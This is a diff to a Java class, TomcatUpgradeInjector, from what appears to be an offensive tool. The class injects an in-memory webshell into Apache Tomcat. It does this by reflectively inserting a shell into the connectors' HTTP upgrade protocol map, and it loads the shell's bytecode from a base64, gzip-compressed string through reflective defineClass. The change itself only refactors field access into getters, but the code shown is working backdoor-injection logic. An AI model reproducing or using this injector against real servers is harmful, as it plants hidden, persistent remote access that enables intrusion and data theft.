@@ -15,6 +15,9 @@ import java.util.zip.GZIPInputStream;
 public class TomcatUpgradeInjector {
     private static String shellClassName;
     private static String shellClass;
+
+    public String getClassName() { return shellClassName; }
+    public String getBase64String() { return shellClass; }
     private static boolean ok;
 
     public TomcatUpgradeInjector() {
@@ -115,12 +118,12 @@ public class TomcatUpgradeInjector {
                 Object value = getFieldValue(protocolHandler, "httpUpgradeProtocols");
                 if (!(value instanceof Map)) continue;
                 Map protocols = (Map) value;
-                if (protocols.containsKey(shellClassName)) {
+                if (protocols.containsKey(getClassName())) {
                     installed = true;
                     continue;
                 }
                 if (shell == null) shell = getShell(context);
-                protocols.put(shellClassName, shell);
+                protocols.put(getClassName(), shell);
                 installed = true;
             } catch (Throwable ignored) {
                 // AJP 等非 HTTP/1.1 Connector 没有 UpgradeProtocol Map。
@@ -143,9 +146,9 @@ public class TomcatUpgradeInjector {
         ClassLoader loader = getWebAppClassLoader(context);
         Class clazz;
         try {
-            clazz = Class.forName(shellClassName, true, loader);
+            clazz = Class.forName(getClassName(), true, loader);
         } catch (ClassNotFoundException ignored) {
-            byte[] bytes = gzipDecompress(decodeBase64(shellClass));
+            byte[] bytes = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod(
                     "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
             defineClass.setAccessible(true);
